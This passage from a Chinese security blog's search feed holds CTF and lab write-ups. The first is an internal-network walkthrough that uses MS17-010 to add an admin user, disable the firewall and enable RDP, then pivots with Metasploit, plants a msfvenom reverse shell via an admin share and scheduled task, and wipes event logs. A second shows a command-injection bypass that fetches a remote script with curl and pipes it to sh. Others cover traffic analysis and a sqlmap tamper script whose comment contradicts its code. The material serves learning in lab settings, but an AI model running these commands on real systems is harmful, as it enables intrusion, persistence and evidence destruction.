class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">从域信息收集可以得到以下信息：</span><br><span class="line"></span><br><span class="line">·  域：god.org</span><br><span class="line">·  域内有三个用户：administrator、ligang、liukaifeng01</span><br><span class="line">·  域内有俩台主机：ROOT-TVI862UBEH(192.168.52.141)、STU1(192.168.52.143)</span><br><span class="line">·  域控：OWA(192.168.52.138)</span><br><span class="line">·  域管理员：administrator</span><br></pre></td></tr></table></figure><h3 id="隧道搭建"><a href="#隧道搭建" class="headerlink" title="隧道搭建"></a>隧道搭建</h3><p>内网中添加路由主要是充当跳板功能， 其实是MSF框架中自带的一个路由转发功能，其实现过程就是MSF框架在已经获取的meterpreter shell的基础上添加一条去往内网的路由，此路由的下一跳转发，即网关，是MSF攻击平台与被攻击目标建立的一个session会话。通过msf添加路由功能，可以直接使用msf去访问原本不能直接访问的内网资源</p><h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br><span class="line">run autoroute -s 192.168.52.0/24</span><br><span class="line">background</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429122238699.png" alt="image-20230429122238699"></p><p><img src="/WEB/ATT&CK-1/image-20230429123519055.png" alt="image-20230429123519055"></p><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/manage/autoroute</span><br><span class="line">show options</span><br><span class="line">set SESSION 2</span><br><span class="line">exploit</span><br><span class="line">route print</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429144413108.png" alt="image-20230429144413108"></p><h4 id="配置socks代理"><a href="#配置socks代理" class="headerlink" title="配置socks代理"></a>配置socks代理</h4><p>代理就是在我们的kali开启了一个socks代理，监听kali本地端口，然后再通过这个端口将流量转给msf，msf转发给路由，所以能将流量直接带入到内网中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429124400134.png" alt="image-20230429124400134"></p><h4 id="连接代理"><a href="#连接代理" class="headerlink" title="连接代理"></a>连接代理</h4><p>代理就是在我们的kali开启了一个socks代理，监听kali本地端口，然后再通过这个端口将流量转给msf，msf转发给路由，所以能将流量直接带入到内网中</p><p><strong>ProxyChains</strong></p><p>ProxyChains是Linux和其他Unix下的代理工具。 它可以使任何程序通过代理上网， 允许TCP和DNS通过代理隧道， 支持HTTP、 SOCKS4和SOCKS5类型的代理服务器， 并且可配置多个代理。 ProxyChains通过一个用户定义的代理列表强制连接指定的应用程序，  直接断开接收方和发送方的连接。</p><p>如果没有ProxyChains的话先 <code>apt install proxychains </code></p><p>然后修改&#x2F;etc&#x2F;proxychains.conf文件</p><p>首次install还需要去掉dynamic_chain的注释<br><img src="/WEB/ATT&CK-1/image-20230429141944115.png" alt="image-20230429141944115">    </p><p><img src="/WEB/ATT&CK-1/image-20230429125456408.png" alt="image-20230429125456408"></p><p>成功再kali命令行访问内网ip</p><p><img src="/WEB/ATT&CK-1/image-20230429144516081.png" alt="image-20230429144516081"></p><p>后面的步骤不需要配置socks5代理也可完成，只需要在msf配置好路由就能攻击</p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><h4 id="MS17-010打ROOT-TVI862UBEH"><a href="#MS17-010打ROOT-TVI862UBEH" class="headerlink" title="MS17-010打ROOT-TVI862UBEH"></a>MS17-010打ROOT-TVI862UBEH</h4><p>上面已经用过fscan收集信息了，似乎域内其他两台主机都有 MS17-010 ，那就直接用msf一把梭试试了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429210730877.png" alt="image-20230429210730877"></p><p><code>exploit/windows/smb/ms17_010_psexec</code>模块执行失败。。。</p><p><img src="/WEB/ATT&CK-1/image-20230429210740703.png" alt="image-20230429210740703"></p><h5 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h5><p><code>auxiliary/admin/smb/ms17_010_command</code>模块可以执行命令，通过这个模块先关闭防火墙，再尝试<code>windows/smb/ms17_010_psexec</code>模块，依旧失败，尝试其他方法吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">set command netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><h5 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h5><p>​<code>auxiliary/admin/smb/ms17_010_command</code>模块可以执行命令，那么我们可以直接添加用户，然后改权限，关防火墙，然后直接远程登录</p><p><img src="/WEB/ATT&CK-1/image-20230429211013036.png" alt="image-20230429211013036"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">set command net user admin123 hongrisec@2023 /add #添加用户</span><br><span class="line">exploit</span><br><span class="line">set command net localgroup administrators admin123 /add #管理员权限</span><br><span class="line">exploit</span><br><span class="line">set command  &quot;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\&quot; \&quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&quot; #开启3389</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429215557203.png" alt="image-20230429215557203"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 192.168.52.141</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230429215734594.png" alt="image-20230429215734594"></p><p><img src="/WEB/ATT&CK-1/image-20230429221211746.png" alt="image-20230429221211746"></p><p>登录然后上msf木马然后getsystem拿下</p><p>当然域控也可以用同一种方式拿下，但是为了学习，还是使用其他方法吧</p><h4 id="psexec-打域控"><a href="#psexec-打域控" class="headerlink" title="psexec 打域控"></a>psexec 打域控</h4><p>参考：<br>    <a href="https://www.freebuf.com/articles/system/332115.html">https://www.freebuf.com/articles/system/332115.html</a><br>    <a href="https://blog.csdn.net/qq_41874930/article/details/108455478">https://blog.csdn.net/qq_41874930/article/details/108455478</a></p><h5 id="什么是Psexec"><a href="#什么是Psexec" class="headerlink" title="什么是Psexec"></a>什么是Psexec</h5><p><code>PsExec</code>是由<code>Mark Russinovich</code>创建的 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">Sysinternals Suite</a>中包含的工具。最初，它旨在作为系统管理员的便利工具，以便他们可以通过在远程主机上运行命令来执行维护任务。<code>PsExec</code>可以算是一个轻量级的 telnet  替代工具，它使您无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与命令控制台几乎相同的实时交互性。PsExec最强大的功能就是在远程系统和远程支持工具（如 ipconfig、whoami）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。</p><h5 id="先关闭防火墙"><a href="#先关闭防火墙" class="headerlink" title="先关闭防火墙"></a>先关闭防火墙</h5><p>还是通过ms17_010执行命令关闭防火墙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set command netsh advfirewall set allprofiles sate off</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230430005650634.png" alt="image-20230430005650634"></p><h5 id="使用msf的psexec模块"><a href="#使用msf的psexec模块" class="headerlink" title="使用msf的psexec模块"></a>使用msf的psexec模块</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOSTS 192.168.52.138</span><br><span class="line">set SMBUser Administrator</span><br><span class="line">set smbpass hongrisec@win7</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>还是失败，谷歌了个遍，不知道是什么原因，可能是因为环境或者msf版本问题吧，尝试其他做法吧</p><p><img src="/WEB/ATT&CK-1/image-20230430013340595.png" alt="image-20230430013340595"></p><h4 id="C盘共享传马打域控"><a href="#C盘共享传马打域控" class="headerlink" title="C盘共享传马打域控"></a>C盘共享传马打域控</h4><p>参考：</p><p>​<a href="https://blog.csdn.net/qq_53263789/article/details/115091561">https://blog.csdn.net/qq_53263789/article/details/115091561</a>   <a href="https://blog.csdn.net/qq_40638006/article/details/122033546">https://blog.csdn.net/qq_40638006/article/details/122033546</a></p><h5 id="用win7连接域控的c盘共享"><a href="#用win7连接域控的c盘共享" class="headerlink" title="用win7连接域控的c盘共享"></a>用win7连接域控的c盘共享</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sessions 1</span><br><span class="line">shell</span><br><span class="line">net use \\192.168.52.138\c$ &quot;hongrisec@2021&quot; /user:&quot;administrator&quot;</span><br><span class="line">dir \\192.168.52.138\c$</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/1682790402459.png" alt="1682790402459"></p><h5 id="生成反弹shell"><a href="#生成反弹shell" class="headerlink" title="生成反弹shell"></a>生成反弹shell</h5><p>因为现在是在用win7（192.168.52.143）做跳板打内网，所以反弹的是win7的ip和端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.52.143 LPORT=9999 -f exe -o msf_msf.exe</span><br></pre></td></tr></table></figure><p>先把生成的shell upload到win7里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload msf_msf.exe ./shell.exe</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230430022300283.png" alt="image-20230430022300283"></p><p>重新shell后dir看看，找到upload的shell</p><p><img src="/WEB/ATT&CK-1/image-20230430022346120.png" alt="image-20230430022346120"></p><p>将shell复制到共享c盘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy shell.exe \\192.168.52.138\c$\shell_msf.exe</span><br></pre></td></tr></table></figure><h5 id="写定时任务"><a href="#写定时任务" class="headerlink" title="写定时任务"></a>写定时任务</h5><p>写定时任务，每分钟执行一次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /sc minute /mo 1 /tn &quot;srn4&quot; /tr &quot;C:\shell.exe&quot; /S 192.168.52.138 /RU System /u administrator /p &quot;hongrisec@win7&quot;</span><br></pre></td></tr></table></figure><p><img src="/WEB/ATT&CK-1/image-20230430022516216.png" alt="image-20230430022516216"></p><h5 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.52.143</span><br><span class="line">set lport 9999</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>成功拿下域控！！（如果没有反弹成功可能是win7也就是143的机子没有关防火墙</p><p><img src="/WEB/ATT&CK-1/image-20230430150932590.png" alt="image-20230430150932590"></p><p><img src="/WEB/ATT&CK-1/image-20230430151509582.png" alt="image-20230430151509582"></p><h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><p>msf自带的痕迹清理    #清除windows中的应用程序日志、系统日志、安全日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev </span><br></pre></td></tr></table></figure><p>全部清一遍就好了</p><p><img src="/WEB/ATT&CK-1/image-20230430153855898.png" alt="image-20230430153855898"></p><p>参考：<a href="https://www.freebuf.com/articles/web/226240.html">https://www.freebuf.com/articles/web/226240.html</a><br>            <a href="https://cloud.tencent.com/developer/article/1937037">https://cloud.tencent.com/developer/article/1937037</a><br>            <a href="https://cloud.tencent.com/developer/article/1759960">https://cloud.tencent.com/developer/article/1759960</a><br>            <a href="https://blog.csdn.net/m0_55793759/article/details/126514312">https://blog.csdn.net/m0_55793759/article/details/126514312</a><br>            <a href="https://www.anquanke.com/post/id/235101#h2-21">https://www.anquanke.com/post/id/235101#h2-21</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 红队 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单popen函数getshell</title>
      <link href="/Writeup/WEB/%E5%8D%95popen%E5%87%BD%E6%95%B0getshell/"/>
      <url>/Writeup/WEB/%E5%8D%95popen%E5%87%BD%E6%95%B0getshell/</url>
      
        <content type="html"><![CDATA[<h1 id="单popen函数getshell"><a href="#单popen函数getshell" class="headerlink" title="单popen函数getshell"></a>单popen函数getshell</h1><p>　　<strong>知识点：代码审计、popen函数、反弹shell</strong></p><p>　　‍</p><p>　　审计源码，popen后没有输出，无法直接看到输入命令的回显，那么我们可以利用反弹shell来直接rce</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">#Try to read /flag</span></span><br><span class="line"><span class="keyword">if</span>(!isset($_GET[<span class="string">&#x27;command&#x27;</span>])&amp;!isset($_GET[<span class="string">&#x27;parameter&#x27;</span>])) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$command = $_GET[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">$parameter = $_GET[<span class="string">&#x27;parameter&#x27;</span>];</span><br><span class="line"></span><br><span class="line">function <span class="built_in">filter</span>($data) &#123;</span><br><span class="line">    $black_list = array(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot; &quot;</span>,<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    foreach ($black_list <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        $data = str_replace($key, <span class="string">&#x27;&#x27;</span>, $data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$command = <span class="built_in">filter</span>($command);</span><br><span class="line">popen(<span class="string">&quot;$command&quot;</span>,$parameter);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>　　这里利用ctfshow中师傅给的一键反弹shell的方法</p><p>　　<img src="/Writeup/WEB/%E5%8D%95popen%E5%87%BD%E6%95%B0getshell/image-20230110213117-otjm4zz.png" alt="image">​</p><p>　　接着绕过空格过滤就好</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">绕过空格反弹shell</span><br><span class="line">?command=curl$IFS$<span class="number">9</span>https:<span class="comment">//your-shell.com/106.53.106.224:1337$IFS$9|sh&amp;parameter=r</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> popen函数 </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP-urgent-pointer</title>
      <link href="/Writeup/MISC/TCP-urgent-pointer/"/>
      <url>/Writeup/MISC/TCP-urgent-pointer/</url>
      
        <content type="html"><![CDATA[<h1 id="TCP-urgent-pointer"><a href="#TCP-urgent-pointer" class="headerlink" title="TCP-urgent-pointer"></a>TCP-urgent-pointer</h1><p>　　<strong>知识点：流量分析、urgent-pointer、脚本编写</strong></p><p>　　‍</p><p>　　首先分析流量，发现upload了一张图片，猜测有关键信息</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/image-20230108220119-fn0x4aa.png" alt="image"></p><p>　　‍</p><p>　　发现上传了一张图片，将它导出</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/image-20230108220216-etjkc21.png" alt="image"></p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/image-20230108220302-h67sn7h.png" alt="image"></p><p>　　‍</p><p>　　得到图片，提示urg</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/image-20230108220316-295m7jj.png" alt="image"></p><p>　　参考<a href="https://writeup.ctfhub.com/Challenge/2019/%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/%E6%88%90%E9%83%BD%E7%AB%99/v1v1LKxrfTfJNn1CaRtkhE.html">https://writeup.ctfhub.com/Challenge/2019/%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/%E6%88%90%E9%83%BD%E7%AB%99/v1v1LKxrfTfJNn1CaRtkhE.html</a></p><p>　　‍</p><p>　　根据提示观察流量包的urgent-pointer</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/image-20230110205344-ujgbhol.png" alt="image"></p><p>　　​</p><p>　　用tshark命令将urgent-pointer的非0值全部导出，并将换行符替换为空格</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/image-20230108220429-nwj9po7.png" alt="image"></p><p>　　‍</p><p>　　基本上每组都是五位数，猜测是十进制数转十六进制，十六进制再转ascii字符</p><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/image-20230110205529-qd40jod.png" alt="image"><img src="/Writeup/MISC/TCP-urgent-pointer/image-20230110210021-n4hwn58.png" alt="image"></p><p>　　得到lf，反过来就说flag的前两个字符，根据这个规则编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = [<span class="number">27750</span>, <span class="number">26465</span>, <span class="number">24955</span>, <span class="number">13113</span>, <span class="number">14393</span>, <span class="number">25907</span>, <span class="number">25910</span>, <span class="number">25905</span>, <span class="number">14647</span>, <span class="number">25701</span>, <span class="number">13622</span>, <span class="number">12644</span>, <span class="number">12848</span>, <span class="number">14178</span>, <span class="number">12599</span>, <span class="number">13411</span>, <span class="number">14642</span>, <span class="number">12387</span>, <span class="number">32054</span>, <span class="number">56125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(long_to_bytes(i))[<span class="number">2</span>:-<span class="number">1</span>][::-<span class="number">1</span>],<span class="string">&quot;(&quot;</span>,long_to_bytes(i),<span class="string">&quot;)&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>　　<img src="/Writeup/MISC/TCP-urgent-pointer/image-20230110210211-7bb8x83.png" alt="image">​</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
            <tag> urgent-pointer </tag>
            
            <tag> 脚本编写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入之编写sqlmap-tamper脚本实现绕过</title>
      <link href="/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/"/>
      <url>/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入之编写sqlmap-tamper脚本实现绕过"><a href="#sql注入之编写sqlmap-tamper脚本实现绕过" class="headerlink" title="sql注入之编写sqlmap-tamper脚本实现绕过"></a>sql注入之编写sqlmap-tamper脚本实现绕过</h1><p>　　<strong>知识点：sql注入漏洞，脚本编写</strong></p><p>　　‍</p><p>　　根据题目提示已知是sql注入，一开始用单引号什么的测试发现不太对劲，后来发现输入的字符与报错返回的字符不一样，右键查看一下源代码，发现输入code的字符会经过这个validate函数</p><p>　　<img src="/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110134533-rx6bbfa.png" alt="image">​</p><p>　　<img src="/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110134322-5xtywse.png" alt="image"><img src="/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110134403-nrweirs.png" alt="image">​</p><p>　　<img src="/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110134350-z1or6ui.png" alt="image"></p><p>　　然后根据题目的混淆函数，</p><p>　　编写sqlmap tamper脚本，然后交给sqlmap跑就ok了（懒狗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sqlmap/tamper/escapequotes.py</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"> </span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        <span class="comment"># Initialize an empty string to store the result</span></span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">      </span><br><span class="line">        <span class="comment"># Iterate through each character in the string</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> payload:</span><br><span class="line">            <span class="comment"># Shift the ASCII value of the character by -1</span></span><br><span class="line">            c_shifted = <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) + <span class="number">1</span>)</span><br><span class="line">            <span class="comment"># Append the shifted character to the result</span></span><br><span class="line">            result += c_shifted</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>　　<img src="/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110140915-o6yy5j9.png" alt="image">​</p><p>　　<img src="/Writeup/WEB/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%BC%96%E5%86%99sqlmap-tamper%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87/image-20230110140927-o0kuzdh.png" alt="image">​</p><p>　　‍</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本编写 </tag>
            
            <tag> sql注入漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
